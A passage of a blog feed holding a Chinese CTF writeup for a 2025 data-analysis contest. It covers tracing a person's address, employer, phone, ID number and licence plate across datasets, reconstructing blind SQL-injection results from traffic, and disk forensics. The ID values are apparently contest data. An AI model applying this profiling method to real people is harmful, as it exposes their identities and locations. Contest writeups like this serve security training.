9c61603b90479b7d4ca85c9b2dc40a83f95855c5b905a1cec94cb283ae4b9f8ab26cebe58fb36d8478277b3a4b147306eb1252201221aad118140a131745bc76d07052f6457cb7c241deb4e01455422bf50d0504547a29b67ac86f7bd53e090dd2eec2089ee08c183d7bd3e34c47c153df652cfc1926d26fca3db9a0150ee92758d24aed54df83298f9a6cabfb598dfff2f9de574641b6cbac00c005c8252386fefed030b146a42ddea448f6245d7aef045342ebc60df5fd683d56cf79a50be755000b06e504d655908ddbfc477e37cb5ea4fd81b1ccb19bebb88af6b09f491fc0792a608b5040d239f1ba3dfb1924d20c7f15483ab176397f095654b69a157fefd54ab72472e0e430ea88c477992f309168c5565e9e5dd6c690f4dc060e074697bf1b9b28378b93a1573a53c25e8f8a0e9c2fd889a267d78181b8a76918c8bbb95c6b7fbf5eed3d618673e96b8925930b6ceba608a3776ef63fa59f2247e824089e66bd6f7c5b9aba8df2ca376062ffb941fee3482b8e9b1cc5134b49bf2b27e2d235a38702f6404966b925be2a273e69ed6a94cef196b87a7108a6bd2ba6b34222dcf3465e5d31298b2dc0414dd0d4c84c2b0f3439f733cebb995aecf9efae891d4ffbdc16aed02d767c6022ae9616f349fc001df9ac48355c9d4eb36408c5e43b3490bbf7ac3a48f60182df5a79829ed3c34cc9c1e6aee13d0ab59b06f2b0fa416055b9d5d8a833fa7c2351f61fd64708026de8196de532727fbfb480e995d3fae420a8cb948f68f189abd98cb17f21849b2e73d654a536ab674714e76c877272a90d615454f1fb731b2a1bb1f794114de46a825ae8e28f9c3ead587b238a07a6ff4e1afe49a010173f42cf5736df41c952ebcd05235588443a97cdd8672bca91b18b18ac01b85285ac81b6b229813062e4ada91227b379f9c1dccf9109128fd11a12068d899e1383efcf1d6d767e91a3f4a705a41939c4f5919b357ceb765848e597bb4e439a3a7269acfc0f07b98058de738f913c2fa1d839ba0a42970c91d709180049b64f4d0cdaff8a03d48b34351af0179235150819a722cfb9ad8324d18fc3c7e1f1dc450830d9c623ada1a21ba333046b621d9aeccce059500c58ab0e6d54f091ca2d8aac64092fb04688133c5192fec756ad77ab37eaa7fb60e0850fd7df214d63e4c44b83f92e87d4438f489a06240b4e4e67f61fcb7bb8cbff2d623cd40d548eb7f7601eb8ed896a4eb84344857fc2151487adae1789a51dfda17643c1ffdc19eaed1dae8c6f626d8f0eb8337e70326f37e261092e46db126a961c98d69c5ca93924f56414020fb7383d27fe1d61d4e4c429069a9318c8cba5de8f47b0fd4797a634d5264efea5d448b3367ca68f0305a71eb8ea0f59b85644246eb4b67918cc79e99e50f29f7bea3105d0fbddc7926ec1153d5400539a728fb417f8640302e20c432ba0c5a3373c3a3316076293cac67d58634d71be06f159dae40ca63840fe4d409897dfc5930a60b4090e8ccfe9686d1ee3ddd20206ddf6c8d9dc6f941dc038a21f73838a5de5e00a0f60fca82d9b72dc6bc96c38c1d517b15dc758a215d9559fe614b7abc12a012693b5aea3c974bc23e6db69b1fe16f29b09bfd542f9c1cc04a4bd2a0abef86830b7833a5b311cdba5755fe2fc4f65f6493df419ff41cc3b21b634014d8b8cb3b046440e7c766bd0919eafa9fab4fc208943ddf1e8c1e21ba2868151f66344b7ec300524fa76a4398b2631898d9315be17f31fd7835d201b108d13e2d5489dbe299852d775f15aa4a5882a6bff71599bc1f7d2d7303ffef87e042a385d9e55224aa85f376e32ca2d93d19dcb54faaa300df910d6900c87db7f12c487080c7ddeda6b0b91a68f65ede8b5f7a6970ecff5e2e65d6b3ef0f1834deac42e1d77c1fb9c8328643ce2ba2f63ca163ad32ec7950828e21b5b51e912265fe44d914988dc682aad3979051483a6a59996feb384253544ef8b4e61370c70af8b9bb96595e14fd447f7f8ab1c356255be6f1d9724c782f6a3990863132f4270c770c3cfb8bcc615ba5c2f3ece06e45c1150a5b5e8f9489c6146cf06c8f4f1cda43c2a02da12849da96c7f691926193e29ee09bc14f42eb952c947237cf3e26f2288d7260421059d1afacab076a6f838d4543721ca367caf800f0f139cf509ae0766a48eee5be2e754fc3c4e7fe71f26f9642b880d23070188b0c49a92ec7aade54371ed5b47f174485ef0f39f0ac855697caace9d0c9e2d9976a72d33d5a7de5ee77106dc2eba2c482f35a2f79c149c0a83da25d5a6cfce9e0948f4646f03836cf8c3e5cacf3e6b43ba3bdabe19a93e4573a9e0f3efdd7ab8d54007d91612e0a890cf7ecbc647363ab812258ec4777a0e4885ae910c1f958d142a8a4bbd178541e6f0994e6478d2fb495d311056b384f5885125e56557fae4ac7ea4d43088c4e968ae825ddc4638cca1fd87c9eccde7db2879af6ad9da3631c6a5cb4846571fc6bc44eca74cb61161c80a2c1245972ceb2800fa113f4ac8ae7e7edcb0d33ce457805fc9f3e0b0074d73692a7ce830b868359b2a6b9083b8d30c0811a7dac04926b5c4fe2271b9162992d01dbe3b1b7c3def23f60226c29808b79e3b2b1157266f9adcf1e132f491a2f161c0ac591a686fa5b477ef92286bb48ba959354e1b6a25d06712487cf735672e0466cfbc7ade4a228c1a1298a10583ba694003c2dde86c3947fe5f590a65f8999b4747c2a3b0a8869f26f69ebf83c862b84a116c0644abadff88299998ff80e93c1f81e0516807433c7d363db1e2539217e06b6d5cdfd89143fedab5617526e1ec4ab51c0ad50928fa099b103bb3d3752080111e214f0e6018770bc2ba03147901a3cdbba75db1fcfa2632d938f0605b4e8f9efa7af9506c7035b5efe0cb750d69cc43c50a7768f485f11273a14c599abadab4dc751def839d7040c3646e6d49db2138892db4696dbf20b651ad6ef055dd762eab92c5ce0e2aae3785ad35157afc6b6e72d45e39e05e086305ce81e963f1809d319f429405547b0d9f3f98597d9da6650e6a27cbe94c2f04a2615809f0cdf8f291408df9b124f307b714adb6cb659e53c524ee0cebb24978fb6226bb7b89dd5a4b68b62fc157a2b7e527ac8323a39427fdfc93b2de2825a2ba404cc372ffdec15a5b3acc638922363b3e67116ec1647d9491b7fa59102a65d53a6a6e755e8efda66ccf66f476c80244bd704b6c07e9869ad034dd762194b5bcd55be7ac5e21284ffc7deef3406afcc83942292352beeb0ff92996ae6765b606462d863d7fef540c3fb9a38c86ee0bbff5a97474889e80feb6c668d733feacb94c45f8d479ba55e8f45ea5e2e7c35cd5cab62d1cdd6f66dbcae1d49d6744d9926d843d6d20c34b1e724f3614f912c2393102e2bc29949a192150840a9f3786bb77202b99ad39240458d087c787cdcb7471657084668d89e36852b0a7e004569c4baebab5e5127768d1eff7c70ba92d8a331b68bce9defd14cf013723e0eb3e2fc0573521eacfdd6d2cd72756c8b9431da20d686ab859fe2cbb23760fa188656f4a0696e51e34835d0668449b04193bde981a46360dfcc5faeb5de1ad18dc9b0424cbf16c44aba4edaa288965490f4378654b5177733698fb9b8f43c673df4e71fd57a35b506a3ecdf69b383e7c866edb2d99ecb159b990ac5e48ede0a28199d259b574050728488bb43511d44d5c1751ff8520d88875beaa4c1c0b12c96d330abc1378938bd33aadaf3610dd018b16d9fc80a7aab5e1b9dc18aff15c4f786a1f826b8fb7781a84d587961e4b943c172203bb4c2b66fd4a32891f8136c985e9ee81d9eb10a03a391298ee4f59e4ac8f47c48fb67f5c6390f5c4d61b002ff850887ce59646928a5e6c071df9c3ba09b783c94d06f5408eee20124e976fc6cc2796f0f2f54941adea5fefe80e008bafdf038226f44c1c8f9648f1217b1ab1b9fee56a5068a9683a1f3a69d97f4df79cf6ace7071b84dbc4f1808bcf976f9498666f13574adb7dd95d9ff2aba931c8a05aac3c06f15abb8bc3ea89c6fbb184239f5fb06c589757959a0dc61c7de922e592da9ab184f84bfb6cbf793277e67431d8f352ca675679eb7b3f1664a36d52fb409e0ba457b844cd9a8813440139c81b547e764f709086a90f2437a6aefa684c87c964d327460a01690ae54fc81c18e8de89f01405d6ded6923f06d950ac01e740a41972a20310243aad0d834b0c8cb6459e439632479e5d638bdcce715d349bfaf2702693874d55aab2e42112a5d87e3594e74cb9ca0cbfcae10474690b6e7fbfdadebfde47bba547665e2556056059d037098e704c69bf96123011e82cbbba676b119c4d38eb2f7350f7e117febd293636aeffeb6addff8b2cba242cdd1b01cc1855a189aeec5697468dd0eb6f0ba2c63b6bfc2e078bc3fbf854176aff15e1ba3058c6834544e8af26f14a664896d3e646a77dd943bd605faff6d3dbf9d09afbd73fc63ce94f740bbd87c3cf10b34c48abca122250d81428870b421adf15a9157d2943c37302e904996afc992d56215b1376ff915313b0729bd204247cf8dfc208734670a4cfea27dbaa9f7e914053a8370c7688bc8df2d5402d06cba31dbd48233546a16ca5111f238f61ea043c0ca72c2404ac753705ba5614c78081410d3b4623780c5a3b2f1314a4cb6398d14eca51267f3a70fd8a8d43445f507addee0da4f9dba6e0d9e1253cbcf616e64437e096286a202da78f8f0a64c9dae4fc49242f1a519e6680cb43ff1307f451cf57180e3779820385debdca5873b0b202d0070d45659bc8eb35ae89f18658f9c54b5fd6414a556dbf94642ccffb56c01dac33e40d585d8a43c76d5b7aaf52e3ffe5e89623bd489cfb35d8e1b3b9b98bd3cc6eaf250818b1692f25d1ce6d8ad2f4ae472532078a79186a77cf9724d92d33d23bfff3b516550a957dc6b0c286053aea19ea42b97b93c33fd2d5a4fd2d208f78b1b09e8b2997f3e459980901f55e9d44470b74ffb4269fcca94a5700fb9bff3bef5898dfd41085c298669853f2718da71adc39cb48cae184afe61027362d77452c89269cb8aeefdf1ec93f8128f4902626be44599fbcf13b158ad0468db8e1f3f9b346a81fe3fd6f9b33f3bab8ed74ee6f35dce3d91d45e226f6c677e8c14e42e12239defc946312632da556128cbdb4bd6cf9675e4708840b3a63b317d05fb9dc3349eadda2a70ac6f208b438616a621e528dc8b3ba2ede92e035a20cda03851fb0766ee0efe118e7e713b8c39daa094bb59c2750d3125cc8448045e2bac9df6037e6422b72506812783bf396cdec851d7c9fb197dbf0687b3fc695c46d292a3951dbb8d99fad2f67522e93e4cf95e2412eb7a6b33f2f5a62fd5cb0587c45c728e497cfb38d236bce4ebfc278159a68ec08166be5f9a3b702a9b4b69d53ba41ba8c63a69bb144cecfcb0f4d7804fb18371a2bffb1567525b5e3eb79ef7f5c697edab01d7f03c10b5ca5608e42aef0761544455d368b43da808ea68421eae7b6173d3f31a173d55c5d73264dcd21b5781da2fb0bf146cf8e72479c305d25031366045198ea3aec6458ab118ea7ad367af483db20d0304516bed2dcd3c099bd297f1d3e9df0fa3b6abe299b718910c61bc3100bc18890e5954b983e758be758317655f454a4e2fe24af4dd4ab742ef37ff6efb5bfeb6700a9dda9f81a2b4a7be0b06a56d1bcd9c8d70948b5aa9c570c2c52b6dab5a4ceb8009568922a7d2dce6b0bb76fd28ca55a031d543cad97146cb2cc522f7a8ebf3c9e64f262322bce26289a8bf4013a7e3d9bd08e0d47772e1061e97aada1a6e33bfd1225ebeabf2b10cd360df665cb3a48ea286c392a7035c60df91a4e131905e54d655092caeeb80b1656231c8703899e32aea02ac20137fd881c9d81a86f05a830fd950866d928c150797786ed12fed8722ee3a4b453c2840b887a0df021dd5ca1264ba61d159c07154e09ae587287734510f81565f36b430d5484daea39a65bc92d4bc7eda15d81b9d024e50c39029335a70cd6b406b6a7d57e3d01a99227706c4c0e5e6c81d6f1a8bd8ab3a2e224a9968a96cc92e8abd0976297bb881f0491fa30b7554223bc9146ae2d83426ae5064017f785147b111e2c8bb2ec97674e925a756d0996751253e5860ea5f2ce0b9c688214b86535f45a98fb5382574979a2ebf1772fc9b1828869e5b8a91b560284fc9a40ce7a5dc6ca629f96bf542ac47138ce621078dc887ce03418b41e1b77bd8ba98a16da87e23a16d4f53c1049eb65ff422fa87c6c9e821c3bf2d6ccbac5bb3d6f423e6b75eb99b1beb9c2f3e943776ad10ec6628c96df5efaa56b3894d8b399fac864360136016bed5444911c68b86c608e9fe7c254d8c449ac232f4218916c5ef</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Blockchain </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字中国2025 数字产业安全积分争夺赛初赛 数据分析 Writeup+复现</title>
      <link href="/posts/cac6789/"/>
      <url>/posts/cac6789/</url>
      
        <content type="html"><![CDATA[<blockquote><p>六个小时的比赛时间还是太短了，流量分析可惜了，看了下其实并不难，但是一个人看几十万条的大流量分析还是太吃力了……</p><p>好在社工算是ak了，多少拉了点分:) 完了这下成开盒大王了</p></blockquote><h2 id="Writeup部分"><a href="#Writeup部分" class="headerlink" title="Writeup部分"></a>Writeup部分</h2><h3 id="溯源与取证"><a href="#溯源与取证" class="headerlink" title="溯源与取证"></a>溯源与取证</h3><p>别的大师傅做的，这里就写复现里了Orz</p><h3 id="数据社工"><a href="#数据社工" class="headerlink" title="数据社工"></a>数据社工</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>要找的是居住地和公司，根据其他任务已经知道了公司，要找的只有居住地，根据手机号等很容易在打车数据里面找到相关经纬度，从而在地图数据中找到小区。</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743410756424-97ecee23-aeea-4750-9fc7-fdd96004e85d.png" alt="img"></p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743410765112-747d201c-5d8c-462a-85d4-1f583156000f.png" alt="img"></p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743410772296-23edd9ed-0214-4864-9845-766def3e0cab.png" alt="img"></p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743410779964-ca6d87ca-7161-48c3-9853-321b8905fadc.png" alt="img"></p><p>华润国际E区:闵行区星辰信息技术园</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>要求找公司名称，通过任务3知道了手机号，在快递单中查找知道了是什么博林科技的</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743410837645-6a79c095-47cd-4421-a7d6-44c28cfa7140.png" alt="img"></p><p>写个python脚本在工商登记数据里找博林</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_string_in_multiple_excels</span>(<span class="params">folder_path, target_string</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 存储匹配结果</span></span><br><span class="line">        results = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历 data0.xlsx 到 data99.xlsx</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):  <span class="comment"># 从 0 到 99</span></span><br><span class="line">            file_name = <span class="string">f&quot;data<span class="subst">&#123;i&#125;</span>.xlsx&quot;</span></span><br><span class="line">            file_path = os.path.join(folder_path, file_name)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检查文件是否存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在检查文件: <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 加载 Excel 文件</span></span><br><span class="line">            workbook = openpyxl.load_workbook(file_path)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 遍历所有工作表</span></span><br><span class="line">            <span class="keyword">for</span> sheet_name <span class="keyword">in</span> workbook.sheetnames:</span><br><span class="line">                sheet = workbook[sheet_name]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 遍历工作表中的每个单元格</span></span><br><span class="line">                <span class="keyword">for</span> row <span class="keyword">in</span> sheet.iter_rows():</span><br><span class="line">                    <span class="keyword">for</span> cell <span class="keyword">in</span> row:</span><br><span class="line">                        <span class="keyword">if</span> cell.value <span class="keyword">and</span> target_string <span class="keyword">in</span> <span class="built_in">str</span>(cell.value):</span><br><span class="line">                            <span class="comment"># 如果找到目标字符串，记录文件名、工作表名称、单元格位置和内容</span></span><br><span class="line">                            result = &#123;</span><br><span class="line">                                <span class="string">&quot;文件名&quot;</span>: file_name,</span><br><span class="line">                                <span class="string">&quot;工作表&quot;</span>: sheet_name,</span><br><span class="line">                                <span class="string">&quot;单元格位置&quot;</span>: cell.coordinate,</span><br><span class="line">                                <span class="string">&quot;单元格内容&quot;</span>: cell.value</span><br><span class="line">                            &#125;</span><br><span class="line">                            results.append(result)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;找到匹配项 - 文件: <span class="subst">&#123;file_name&#125;</span>, 工作表: <span class="subst">&#123;sheet_name&#125;</span>, 单元格: <span class="subst">&#123;cell.coordinate&#125;</span>, 内容: <span class="subst">&#123;cell.value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 输出最终结果</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> results:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;未找到匹配的字符串。&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n=== 查找结果 ===&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> res <span class="keyword">in</span> results:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;文件: <span class="subst">&#123;res[<span class="string">&#x27;文件名&#x27;</span>]&#125;</span>, 工作表: <span class="subst">&#123;res[<span class="string">&#x27;工作表&#x27;</span>]&#125;</span>, 单元格: <span class="subst">&#123;res[<span class="string">&#x27;单元格位置&#x27;</span>]&#125;</span>, 内容: <span class="subst">&#123;res[<span class="string">&#x27;单元格内容&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    folder_path = <span class="built_in">input</span>(<span class="string">&quot;请输入包含 Excel 文件的文件夹路径: &quot;</span>).strip()</span><br><span class="line">    search_string = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的字符串: &quot;</span>).strip()</span><br><span class="line">    find_string_in_multiple_excels(folder_path, search_string)</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743410943953-ff79d490-e48d-4568-81bd-d3d0c1446c72.png" alt="img"></p><p>江苏博林科技有限公司</p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>要找手机号，已知姓名，去爬取的网页中找</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743410966769-c015f2f4-d6b2-477e-a75c-b04320585fec.png" alt="img"></p><p>13891889377</p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>要找身份证号，已知手机号，仍然去爬取的网页中找</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743410999957-22ff65c6-13e2-46c6-b94e-30a67217556d.png" alt="img"></p><p>61050119980416547X</p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>要车牌号，已知手机号，去停车场数据中找，手动硬找，总能找到:)</p><p>578.jpg</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743411061520-8f71fb94-9394-4691-918a-64f4f871900b.png" alt="img"></p><p>浙B QY318</p><h3 id="数据攻防"><a href="#数据攻防" class="headerlink" title="数据攻防"></a>数据攻防</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>分析流量发现后面有大量的部分是在进行布尔盲注，把注入得到的结果还原出来就好</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743411104648-a4942884-d752-4130-acd9-826b803f2b67.png" alt="img"></p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743411108729-2f619483-00f0-41f9-885a-2c94f1e2031e.png" alt="img"></p><p>f84c4233dd185ca3c083c7b3dbc4ff8b</p><h3 id="数据跨境"><a href="#数据跨境" class="headerlink" title="数据跨境"></a>数据跨境</h3><p>完全没来得及看。。。</p><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><h3 id="溯源与取证-1"><a href="#溯源与取证-1" class="headerlink" title="溯源与取证"></a>溯源与取证</h3><h4 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h4><p>用ftk挂载就能看到docx文档</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743411691702-6ae343b6-bf77-4eb6-a23c-e46ff8e1bf33.png" alt="img"></p><p>提取出来打开以后不难发现有一段白色文字，改下颜色就行</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743411894467-dbda13c6-bdea-40ad-9916-9866d7667678.png" alt="img"></p><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>上面可以看到img里还有个内存.7z，导出以后解压发现是个windows内存镜像。另外还有个log，应该就是题目所说的加密磁盘。通过vol等分析不难发现是truecrypt加密的，用passware kit恢复一下。</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743413880674-359043cc-05b6-4908-ae98-c1372b5f7426.png" alt="img"></p><p>挂载到ftk上就可以看到日志文件，以及我们需要的ip</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743413931445-22fbe853-cd97-4a94-9f55-0eb0532e8d63.png" alt="img"></p><p>114.10.143.92</p><h4 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h4><p>又是一大堆的布尔盲注的日志</p><p>通过观察，先初步筛选一下有用的日志，找到查询id_card且返回包长度为704的</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743429580584-a831e48d-4650-4f87-a383-11e11284d2f9.png" alt="img"></p><p>再找到查询name且返回包长度为704的</p><p><img 